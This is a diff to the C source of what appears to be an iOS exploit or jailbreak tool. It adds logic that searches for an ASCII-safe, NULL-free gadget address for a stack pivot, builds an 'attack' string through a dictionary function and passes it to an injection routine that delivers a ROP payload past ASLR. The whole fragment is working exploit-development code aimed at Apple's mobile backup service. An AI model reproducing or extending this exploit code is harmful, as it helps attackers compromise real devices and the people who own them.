@@ -24,6 +24,7 @@
 #include "mb2.h"
 #include "debug.h"
 #include "device.h"
+#include "dictionary.h"
 #include "crashreporter.h"
 
 #include "offsets.h"
@@ -103,6 +104,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	// TODO: This code here needs to be stuck in a separate function, it looks ugly here
 	int i = 0;
 	int found = 0;
 	unsigned int address = 0;
@@ -110,7 +112,11 @@ int main(int argc, char* argv[]) {
 	//  safe address for our stack pivot
 	for(i = 0; offsets[i].offset != 0; i++){
 		address = crash->dylibs[2]->offset + offsets[i].offset;
+		// Make sure none of the bytes have their highest bit set
+		// This ensures all bytes will pass the ASCII filter
 		if((address & 0x80808080) == 0
+				// Make sure the address has no NULL's in it
+				// This will cause our string to terminate prematurely
 				&& (address & 0x7F000000) != 0
 				&& (address & 0x007F0000) != 0
 				&& (address & 0x00007F00) != 0
@@ -120,19 +126,28 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-	if(found) {
-		info("Usable ASCII safe gadget address found at 0x%08x\n", address);
-
-	} else {
+	if(found == 0) {
 		error("Unable to find ASCII safe gadget address for stack pivot\n");
 		return -1;
 	}
+	info("Usable ASCII safe gadget address found at 0x%08x\n", address);
+
+	int size = 0;
+	char* attack = NULL;
+	err = dictionary_make_attack(address, &attack, &size);
+	if(err < 0) {
+		error("Unable to make dictionary attack string for injection\n");
+		return -1;
+	}
+
+	info("Press any key to crash application...\n");
+	getchar();
 
 	// Due to Apple's new ASLR, before we can overwrite stack with our ROP payload,
 	//  we're going to need to figure out where our data is being stored. Heap
 	//  and stack are randomized on each execution.
 	info("Injecting ROP payload and leaking it's addresss\n");
-	err = mb2_inject(mb2);
+	err = mb2_inject(mb2, attack, size);
 	if(err < 0) {
 		error("Unable to inject ROP payload or discover it's offset\n");
 		device_free(device);
